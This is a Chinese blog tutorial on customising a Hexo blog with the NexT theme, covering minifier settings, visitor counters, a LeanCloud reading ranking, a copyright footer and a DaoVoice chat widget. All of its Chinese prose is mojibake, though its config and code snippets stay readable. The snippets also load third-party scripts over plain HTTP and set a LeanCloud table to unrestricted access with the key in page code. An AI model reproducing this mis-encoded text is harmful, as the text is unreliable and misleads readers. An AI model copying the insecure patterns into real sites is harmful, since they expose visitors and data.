è›®å¤šæœ‹å‹ä½¿ç”¨äº†gulpå¯¹åšå®¢è¿›è¡ŒåŽ‹ç¼©ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªåŠžæ³•ï¼Œä½†åœ¨ç¤¾åŒºé€›äº†ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ¯”è¾ƒå¥½ç”¨çš„æ¨¡å—hexo-all-minifierï¼Œè¿™ä¸ªæ¨¡å—é›†æˆäº†å¯¹ htmlã€cssã€jsã€image çš„ä¼˜åŒ–ã€‚1npm install hexo-all-minifier --save å®‰è£…ä¸Šæ­¤æ¨¡å—åŽï¼Œåªè¦åœ¨æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ä¸­åŠ ä¸Šå¦‚ä¸‹å­—æ®µå°±å¯å¯¹åšå®¢æ‰€æœ‰å†…å®¹è¿›è¡ŒåŽ‹ç¼©ã€‚12345678910111213141516171819202122232425html_minifier: enable: true ignore_error: false exclude:css_minifier: enable: true exclude: - '*.min.css'js_minifier: enable: true mangle: true output: compress: exclude: - '*.min.js'image_minifier: enable: true interlaced: false multipass: false optimizationLevel: 2 pngquant: false progressive: falseä¾§è¾¹æ æ·»åŠ ç¤¾äº¤å›¾æ ‡æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlï¼Œæœç´¢social:,åœ¨å›¾æ ‡åº“æ‰¾è‡ªå·±å–œæ¬¢çš„å°å›¾æ ‡ï¼Œå¹¶å°†åå­—å¤åˆ¶åœ¨å¦‚ä¸‹ä½ç½®ï¼Œä¿å­˜å³å¯ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæžœæ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:\blog\themes\next\source\css\_common\components\postæ–‡ä»¶å¤¹ä¸‹çš„post.styl,æ·»åŠ ä»¥ä¸‹cssæ ·å¼ï¼š12345678// ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæžœ .post &#123; margin-top: 0px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125;åœ¨åšå®¢åº•éƒ¨æ·»åŠ è®¿é—®é‡æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:/blog/themes/next/_config.yml,æ‰¾åˆ°busuanziï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å‚æ•°ï¼š123456busuanzi_count: enable: true total_visitors: true total_visitors_icon: user total_views: true total_views_icon: eyeä½¿ç”¨leancloudç»Ÿè®¡é¡µé¢è®¿é—®æ¬¡æ•°æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• ä¸»é¢˜é›†æˆäº†leancloudï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦åŽ»å®˜ç½‘æ³¨å†Œè´¦å·å¹¶å®žåï¼Œè¿™é‡Œè®²ä¸€ä¸‹å…³é”®çš„æ­¥éª¤ã€‚é…ç½®leancloudåˆ›å»ºåº”ç”¨ï¼šæŽ§åˆ¶å° --&gt; åˆ›å»ºåº”ç”¨ï¼ˆå¼€å‘ç‰ˆï¼‰åº”ç”¨åç§°å¯ä»¥éšæ„è¾“å…¥ï¼ŒåŽé¢è¿˜å¯ä»¥ä¿®æ”¹ï¼Œæˆ‘çš„æ˜¯blogåˆ›å»ºclassï¼š ç‚¹å‡»åˆšåˆ›å»ºçš„åº”ç”¨ï¼Œåˆ›å»ºä¸€ä¸ª Class è¡¨ç”¨æ¥ä¿å­˜æˆ‘ä»¬çš„åšå®¢è®¿é—®æ•°æ®ã€‚æ­¤å¤„åˆ›å»ºçš„ Class åå­—å¿…é¡»ä¸º Counterï¼ŒACL æƒé™é€‰æ‹© æ— é™åˆ¶ã€‚åˆ›å»º Class å®Œæˆä¹‹åŽï¼Œæ–°åˆ›å»ºçš„ Counter è¡¨ä¼šæ˜¾ç¤ºåœ¨å·¦ä¾§ï¼Œè¿™æ—¶å†åˆ‡æ¢åˆ° test åº”ç”¨çš„ è®¾ç½® - åº”ç”¨ Key ç•Œé¢ï¼šå¤åˆ¶IDå’ŒKeyå¯ç”¨leancloud æ‰“å¼€_config.ymlä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ°leancloud_visitors:,å¡«å…¥idå’Œkeyã€‚ä¿®æ”¹çƒ­åº¦ æ‰“å¼€H:/blog/themes/next/layout/_macro/post.swigæ–‡ä»¶ï¼Œæ‰¾åˆ°leancloud,ä¿®æ”¹æˆå¦‚ä¸‹ä»£ç ï¼š æœ€åŽæ‰“å¼€H:/blog/themes/next/languages/zh-CN.yml,æŠŠviewså‚æ•°æ”¹æˆå¦‚ä¸‹ï¼šåšå®¢æ ‡é¢˜è®¾ç½® è¿™ä¸ªç›¸å…³çš„è®¾ç½®åœ¨H:/blog/_config.ymlä¸­ä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šåšå®¢åº•éƒ¨æ·»åŠ ç½‘ç«™çš„è¿è¡Œæ—¶é—´æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:/blog/themes/next/layout/_partials/footer.swigï¼Œåœ¨æœ«å°¾æ·»åŠ å¦‚ä¸‹ä»£ç ;12345678910111213141516171819&lt;!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® --&gt;&lt;span id="timeDate"&gt;è½½å…¥å¤©æ•°...&lt;/span&gt;&lt;span id="times"&gt;è½½å…¥æ—¶åˆ†ç§’...&lt;/span&gt;&lt;script&gt; var now = new Date(); function createtime() &#123; var grt= new Date("07/12/2019 18:30:00");//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´ now.setTime(now.getTime()+250); days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 )&#123;hnum = "0" + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = "0" + mnum;&#125; seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = "0" + snum;&#125; document.getElementById("timeDate").innerHTML = "ç½‘ç«™å·²è¿è¡Œ "+dnum+" å¤© "; document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"; &#125;setInterval("createtime()",250);&lt;/script&gt;æ·»åŠ  README.md æ–‡ä»¶ æ¯ä¸ªé¡¹ç›®ä¸‹ä¸€èˆ¬éƒ½æœ‰ä¸€ä¸ª README.md æ–‡ä»¶ï¼Œä½†æ˜¯ä½¿ç”¨ hexo éƒ¨ç½²åˆ°ä»“åº“åŽï¼Œé¡¹ç›®ä¸‹æ˜¯æ²¡æœ‰ README.md æ–‡ä»¶çš„ã€‚ åœ¨ Hexo ç›®å½•ä¸‹çš„ source æ ¹ç›®å½•ä¸‹æ·»åŠ ä¸€ä¸ª README.md æ–‡ä»¶ï¼Œä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶ _config.ymlï¼Œå°† skip_render å‚æ•°çš„å€¼è®¾ç½®ä¸ºskip_render: README.md ä¿å­˜é€€å‡ºå³å¯ã€‚å†æ¬¡ä½¿ç”¨ hexo d å‘½ä»¤éƒ¨ç½²åšå®¢çš„æ—¶å€™å°±ä¸ä¼šåœ¨æ¸²æŸ“ README.md è¿™ä¸ªæ–‡ä»¶äº†ã€‚è‡ªå®šä¹‰ç½‘ç«™çš„å›¾æ ‡æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æˆ‘çš„å›¾æ ‡æ˜¯åœ¨é˜¿é‡ŒçŸ¢é‡å›¾æ ‡åº“ä¸‹è½½çš„ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨å…¶ä»–åœ°æ–¹ä¸‹è½½æˆ–è€…åˆ¶ä½œï¼Œç„¶åŽæŠŠå›¾æ ‡æ”¾åœ¨Hï¼š/blog/themes/next/source/imagesé‡Œé¢ï¼Œæ–Œä¸”ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼š1234567favicon: small: /images/favicon-16x16-next.png medium: /images/favicon-32x32-next.png apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xmlæ–‡ç« å­—æ•°ã€é˜…è¯»æ—¶é•¿ç»Ÿè®¡æ•ˆæžœå›¾å®žçŽ°æ•ˆæžœ æ‰“å¼€åšå®¢æ ¹ç›®å½•ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£…æ’ä»¶1npm install hexo-symbols-count-time --save ç„¶åŽä¿®æ”¹åšå®¢é…ç½®æ–‡ä»¶ï¼Œåœ¨æœ«å°¾æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š123456symbols_count_time: symbols: true # æ–‡ç« å­—æ•°ç»Ÿè®¡ time: true # æ–‡ç« é˜…è¯»æ—¶é•¿ total_symbols: true # ç«™ç‚¹æ€»å­—æ•°ç»Ÿè®¡ total_time: true # ç«™ç‚¹æ€»é˜…è¯»æ—¶é•¿ exclude_codeblock: false # æŽ’é™¤ä»£ç å­—æ•°ç»Ÿè®¡ æœ€åŽåœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œæ‰¾åˆ°symbols_count_time,ä¿®æ”¹æˆä»¥ä¸‹å†…å®¹ï¼š1234567symbols_count_time: separated_meta: true # æ˜¯å¦å¦èµ·ä¸€è¡Œï¼ˆtrueçš„è¯ä¸å’Œå‘è¡¨æ—¶é—´ç­‰åŒä¸€è¡Œï¼‰ item_text_post: true # é¦–é¡µæ–‡ç« ç»Ÿè®¡æ•°é‡å‰æ˜¯å¦æ˜¾ç¤ºæ–‡å­—æè¿°ï¼ˆæœ¬æ–‡å­—æ•°ã€é˜…è¯»æ—¶é•¿ï¼‰ item_text_total: true # é¡µé¢åº•éƒ¨ç»Ÿè®¡æ•°é‡å‰æ˜¯å¦æ˜¾ç¤ºæ–‡å­—æè¿°ï¼ˆç«™ç‚¹æ€»å­—æ•°ã€ç«™ç‚¹é˜…è¯»æ—¶é•¿ï¼‰ awl: 1.5 # Average Word Length wpm: 100 # Words Per Minuteï¼ˆæ¯åˆ†é’Ÿé˜…è¯»è¯æ•°ï¼‰ suffix: mins.åšå®¢é¡¶ç«¯æ·»åŠ åŠ è½½æ¡æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ°pace:ï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š123456pace: true# Themes list:# pace-theme-big-counter | pace-theme-bounce | pace-theme-barber-shop | pace-theme-center-atom# pace-theme-center-circle | pace-theme-center-radar | pace-theme-center-simple | pace-theme-corner-indicator# pace-theme-fill-left | pace-theme-flash | pace-theme-loading-bar | pace-theme-mac-osx | pace-theme-minimalpace_theme: pace-theme-minimalåœ¨æ–‡ç« åº•éƒ¨æ·»åŠ ç‰ˆæƒä¿¡æ¯æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€Hï¼š/blog/themes/next/layout/_macroï¼Œæ·»åŠ my-copyright.swigï¼Œä»£ç å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728293031&#123;% if page.copyright %&#125;&lt;div class="my_post_copyright"&gt; &lt;script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- JSåº“ sweetalert å¯ä¿®æ”¹è·¯å¾„ --&gt; &lt;script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"&gt;&lt;/script&gt; &lt;link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"&gt; &lt;p&gt;&lt;span&gt;æœ¬æ–‡æ ‡é¢˜:&lt;/span&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;æ–‡ç« ä½œè€…:&lt;/span&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt; | ã€å…¬ä¼—å·ï¼šä¸ä¼šä»£ç çš„ç¨‹åºçŒ¿ã€‘&lt;/p&gt; &lt;p&gt;&lt;span&gt;å‘å¸ƒæ—¶é—´:&lt;/span&gt;&#123;&#123; page.date.format("YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;æœ€åŽæ›´æ–°:&lt;/span&gt;&#123;&#123; page.updated.format("YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;åŽŸå§‹é“¾æŽ¥:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;" title="&#123;&#123; page.title &#125;&#125;"&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;è®¸å¯åè®®:&lt;/span&gt;&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"&gt;ç½²å-éžå•†ä¸šæ€§ä½¿ç”¨-ç¦æ­¢æ¼”ç»Ž 4.0 å›½é™…&lt;/a&gt; è½¬è½½è¯·ä¿ç•™åŽŸæ–‡é“¾æŽ¥åŠä½œè€…ã€‚&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard('.fa-clipboard'); clipboard.on('success', $(function()&#123; $(".fa-clipboard").click(function()&#123; swal(&#123; title: "", text: 'å¤åˆ¶æˆåŠŸ', html: false, timer: 500, showConfirmButton: false &#125;); &#125;); &#125;)); &lt;/script&gt;&#123;% endif %&#125; ç„¶åŽåœ¨Hï¼š/blog/themes/next/source/css/_common/components/post/ä¸‹æ·»åŠ my-post-copyright.stylï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #333333; // title color font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover &#123; color: #0593d3; // link color text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; ç„¶åŽæ‰“å¼€H:/blog/themes/next/layout/_macro/post.swigæ–‡ä»¶ï¼Œåœ¨post-body ä¹‹åŽï¼Œ post-footer ä¹‹å‰æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'my-copyright.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; æœ€åŽä¿®æ”¹next/source/css/_common/components/post/post.stylæ–‡ä»¶ï¼Œåœ¨æœ€åŽä¸€è¡Œå¢žåŠ ä»£ç ï¼š1@import "my-post-copyright"æ·»åŠ æ¥å¿…åŠ›è¯„è®ºç³»ç»Ÿæ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€æ¥å¿…åŠ›çš„å®˜ç½‘ï¼Œæ³¨å†Œï¼Œæ³¨å†Œå¥½ä¹‹åŽæ‰“å¼€è®¾ç½®é¡µé¢ï¼Œå¡«å†™åšå®¢åœ°å€ ç„¶åŽåœ¨ä»£ç ç®¡ç†é¡µé¢ï¼ŒæŠŠuidå¤åˆ¶åˆ°ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlçš„livere_uid:ä¿®æ”¹åšå®¢åº•éƒ¨çš„çº¢è‰²è·³åŠ¨çˆ±å¿ƒ æ‰“å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ°footer:ï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼šDaoVoiceåœ¨çº¿è”ç³»æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• å…ˆåœ¨ daovoice æ³¨å†Œè´¦å·ï¼Œé‚€è¯·ç æ˜¯dda712fbï¼Œæ³¨å†Œå®ŒæˆåŽä¼šå¾—åˆ°ä¸€ä¸ª app_id : ç„¶åŽæ‰“å¼€/themes/next/layout/_partials/head.swig,åœ¨æœ«å°¾æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š123456789&#123;% if theme.daovoice %&#125; &lt;script&gt; (function(i,s,o,g,r,a,m)&#123;i["DaoVoiceObject"]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)&#125;)(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/dda712fb.js","daovoice") daovoice('init', &#123; app_id: "&#123;&#123;theme.daovoice_app_id&#125;&#125;" &#125;); daovoice('update'); &lt;/script&gt;&#123;% endif %&#125; æœ€åŽæ‰“å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œåœ¨æœ«å°¾æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š123# Online contactdaovoice: truedaovoice_app_id: è¿™é‡Œå¡«ä½ çš„åˆšæ‰èŽ·å¾—çš„ app_idè®¾ç½®åšå®¢æ‘˜è¦æ˜¾ç¤º æ‰“å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š è¿™æ ·å°±èƒ½å®žçŽ°åœ¨ä¸»é¡µåªå±•ç¤ºéƒ¨åˆ†æ–‡å­—ï¼Œå…¶ä»–æ–‡å­—éšè—èµ·æ¥ï¼Œé€šè¿‡ç‚¹å‡»â€™é˜…è¯»æ›´å¤šâ€™æ¥é˜…è¯»å…¨æ–‡ã€‚åœ¨å†™æ¯ä¸€ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œä¹Ÿè¦åœ¨å¿…è¦çš„åœ°æ–¹æ·»åŠ &lt;!-- more --&gt;123456789101112131415---title: ä½¿ç”¨Github+Hexoæ­å»ºä½ çš„ä¸ªäººåšå®¢ï¼šæ­å»ºç¯‡copyright: truedate: 2019-07-21 15:25:12categories: Hexotags: [GitHub,ä¸ªäººåšå®¢,Hexo]---&lt;blockquote class="blockquote-center"&gt;æµ·é˜”å‡­é±¼è·ƒï¼Œå¤©é«˜ä»»é¸Ÿé£žã€‚&lt;/blockquote&gt; æ—©åœ¨åˆä¸­ï¼Œå°±æƒ³ç€è‡ªå·±æ­èµ·ä¸€ä¸ªå±žäºŽè‡ªå·±çš„ç½‘ç«™ï¼Œä½†æ˜¯æ²¡æœ‰æŠ€æœ¯åˆä¸è‚¯å­¦ä¹ çš„æˆ‘ï¼Œæ€¯äºŽå°è¯•ï¼Œä¸€ç›´åœæ»žä¸å‰ã€‚å¤§å­¦æœŸé—´ç»ˆäºŽå­¦ä¹ äº†ï¼Œåˆå› ä¸ºè‡ªå·±çš„æ‡’æƒ°ï¼Œè§‰å¾—å¾ˆéš¾ï¼Œä¸è‚¯åŽ»å°è¯•ã€‚ç›´è‡³ä»Šæ—¥ï¼Œæˆ‘æƒ³è¯•ä¸€è¯•ï¼Œæ£é¼“äº†å¥½ä¸€é˜µå­ï¼Œå‘çŽ°è®¤çœŸåŽ»åšäº†ï¼Œä¹Ÿæ²¡æœ‰æƒ³è±¡ä¸­çš„éš¾ã€‚&lt;!-- more --&gt;æ–‡ç« é“¾æŽ¥å”¯ä¸€åŒ– ä¹Ÿè®¸ä½ ä¼šæ•°æ¬¡æ›´æ”¹æ–‡ç« é¢˜ç›®æˆ–è€…å˜æ›´æ–‡ç« å‘å¸ƒæ—¶é—´ï¼Œåœ¨é»˜è®¤è®¾ç½®ä¸‹ï¼Œæ–‡ç« é“¾æŽ¥éƒ½ä¼šæ”¹å˜ï¼Œä¸åˆ©äºŽæœç´¢å¼•æ“Žæ”¶å½•ï¼Œä¹Ÿä¸åˆ©äºŽåˆ†äº«ã€‚å”¯ä¸€æ°¸ä¹…é“¾æŽ¥æ‰æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ é¦–å…ˆå®‰è£…æ’ä»¶1npm install hexo-abbrlink --save ç„¶åŽåœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°permalinkï¼Œä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ï¼š1permalink: posts/:abbrlink/ # â€œposts/â€ å¯è‡ªè¡Œæ›´æ¢ è¿™é‡Œæœ‰ä¸ªçŸ¥è¯†ç‚¹ï¼šç™¾åº¦èœ˜è››æŠ“å–ç½‘é¡µçš„è§„åˆ™: å¯¹äºŽèœ˜è››è¯´ç½‘é¡µæƒé‡è¶Šé«˜ã€ä¿¡ç”¨åº¦è¶Šé«˜æŠ“å–è¶Šé¢‘ç¹ï¼Œä¾‹å¦‚ç½‘ç«™çš„é¦–é¡µå’Œå†…é¡µã€‚èœ˜è››å…ˆæŠ“å–ç½‘ç«™çš„é¦–é¡µï¼Œå› ä¸ºé¦–é¡µæƒé‡æ›´é«˜ï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†çš„é“¾æŽ¥éƒ½æ˜¯æŒ‡å‘é¦–é¡µã€‚ç„¶åŽé€šè¿‡é¦–é¡µæŠ“å–ç½‘ç«™çš„å†…é¡µï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰å†…é¡µèœ˜è››éƒ½ä¼šåŽ»æŠ“å–ã€‚ æœç´¢å¼•æ“Žè®¤ä¸ºå¯¹äºŽä¸€èˆ¬çš„ä¸­å°åž‹ç«™ç‚¹ï¼Œ3å±‚è¶³å¤Ÿæ‰¿å—æ‰€æœ‰çš„å†…å®¹äº†ï¼Œæ‰€ä»¥èœ˜è››ç»å¸¸æŠ“å–çš„å†…å®¹æ˜¯å‰ä¸‰å±‚ï¼Œè€Œè¶…è¿‡ä¸‰å±‚çš„å†…å®¹èœ˜è››è®¤ä¸ºé‚£äº›å†…å®¹å¹¶ä¸é‡è¦ï¼Œæ‰€ä»¥ä¸ç»å¸¸çˆ¬å–ã€‚å‡ºäºŽè¿™ä¸ªåŽŸå› æ‰€ä»¥permalinkåŽé¢è·Ÿç€çš„æœ€å¥½ä¸è¦è¶…è¿‡2ä¸ªæ–œæ ã€‚ æŽ¥ç€åœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :123# abbrlink configabbrlink: alg: crc32 # ç®—æ³•ï¼šcrc16(default) and crc32rep: hex # è¿›åˆ¶ï¼šdec(default) and hexå¯é€‰æ‹©æ¨¡å¼ï¼šcrc16 &amp; hexcrc16 &amp; deccrc32 &amp; hexcrc32 &amp; decä¿®æ”¹é¡¶ç«¯çš„çº¿æ¡é¢œè‰² nextä¸»é¢˜é¡¶ç«¯çš„çº¿æ¡é¢œè‰²é»˜è®¤æ˜¯é»‘è‰²çš„ï¼Œæˆ‘çœ‹ç€ä¸èˆ’æœå°±æŠŠå®ƒæ”¹æˆäº†ç²‰è‰²æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€themes/next/source/css/_variables/base.styl,æ‰¾åˆ°headbandï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š1234// Headband// --------------------------------------------------$headband-height = 2px$headband-bg = #e3cae4åŽ»é™¤æ–‡ç« ä¸‹æ–¹åˆ†ç±»äºŽçš„ä¸‹åˆ’çº¿ æ‰“å¼€themes/next/source/css/_common/scaffolding/base.styl,æ‰¾åˆ°span.exturlï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š12345678a, span.exturl &#123; word-wrap(); // Remove the gray background color from active links in IE 10. background-color: transparent; color: #999999; text-decoration: none; outline: none; border-bottom: 0px solid $link-decoration-color;å·¦ä¾§ç¤¾äº¤å›¾æ ‡å±…ä¸­ å¼ºè¿«ç—‡çš„æˆ‘å±…ç„¶å‘çŽ°äº†å·¦ä¾§ç¤¾äº¤å›¾æ ‡ä¼¼ä¹Žä¸å¤ªå±…ä¸­å•Šï¼Œä¸€å®šå¾—æŠŠå®ƒæžå±…ä¸­ã€‚æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€themes/next/source/css/_schemes/Pisces/_sidebar.styl,æ‰¾åˆ°.site-overviewï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š1234.site-overview &#123; //margin: 0 2px; text-align:&#125;å»ºç«‹é˜…è¯»æŽ’è¡Œæ¦œ æ–°å»ºä¸€ä¸ªé˜…è¯»æŽ’è¡Œæ¦œç•Œé¢ï¼Œï¼Œç”¨äºŽæ˜¾ç¤ºæœ¬ç«™æ–‡ç« çš„é˜…è¯»æŽ’è¡Œæ¦œï¼ŒåŸºäºŽlencloudè¿›è¡Œç»Ÿè®¡æ–°å»ºé¡µé¢ hexo n page top æ–°å»ºé¡µé¢ï¼Œç”Ÿæˆ top ç›®å½•ï¼Œç¼–è¾‘å…¶ä¸­è‡ªåŠ¨ç”Ÿæˆçš„ index.md æ–‡ä»¶ï¼Œå°†å…¶ä¸­çš„ä»£ç æ›¿æ¢å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425&lt;div id="top"&gt;&lt;/div&gt;&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"&gt;&lt;/script&gt;&lt;script&gt;AV.initialize("leancloud_appidè¿™é‡Œå¡«å…¥ä½ çš„id", "leancloud_appkeyè¿™é‡Œå¡«å…¥ä½ çš„key");&lt;/script&gt;&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter'); query.notEqualTo('id',0); query.descending('time'); query.limit(1000); query.find().then(function (todo) &#123; for (var i=0;i&lt;1000;i++)&#123; var result=todo[i].attributes; time=result.time; title=result.title; url=result.url; // var content="&lt;a href='"+"https://hoxis.github.io"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;br&gt;"+"&lt;font color='#fff'&gt;"+"é˜…è¯»æ¬¡æ•°ï¼š"+time+"&lt;/font&gt;"+"&lt;br&gt;&lt;br&gt;"; var content="&lt;p&gt;"+"&lt;font color='#e20404'&gt;"+"ã€çƒ­åº¦"+time+"â„ƒã€‘"+"ï¼š"+"&lt;a href='"+"https://xiaoxiaoxiaoxiaolin.github.io"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;/p&gt;"; document.getElementById("top").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt; é‡Œé¢çš„leancloud_appidã€leancloud_appkey è¿˜æœ‰é¡µé¢é“¾æŽ¥è®°å¾—æ›¿æ¢æˆä½ çš„ã€‚ç¼–è¾‘èœå• æ‰“å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ topï¼š1234567menu: home: / || home top: /top/ || signal categories: /categories/ || th tags: /tags/ || tags archives: /archives/ || archive about: /about/ || user ç„¶åŽè¿˜éœ€è¦å¯¹ä¸­æ–‡é…ç½®hexo/blog/themes/next/languages/zh-CN.ymlè¿›è¡Œä¿®æ”¹ï¼Œæ·»åŠ topå¯¹åº”çš„ä¸­æ–‡ï¼š1234567891011menu: home: é¦–é¡µ top: çƒ­æ¦œ archives: å½’æ¡£ categories: åˆ†ç±» tags: æ ‡ç­¾ about: å…³äºŽ search: æœç´¢ schedule: æ—¥ç¨‹è¡¨ sitemap: ç«™ç‚¹åœ°å›¾ commonweal: å…¬ç›Š 404githubåˆ†æ”¯ç®¡ç†åšå®¢ ä½¿ç”¨hexoå‘å¸ƒåšå®¢æœ€éº»çƒ¦çš„åœ°æ–¹åœ¨äºŽï¼Œå½“ä½ æ¢äº†ä¸€å°ç”µè„‘åŽåˆæƒ³å‘å¸ƒåšå®¢ï¼Œåˆå¾—æŠŠå…ˆå‰çš„çŽ¯å¢ƒé‡æ–°æ­å»ºï¼Œæ‹‰å–ä»“åº“ã€‚å› 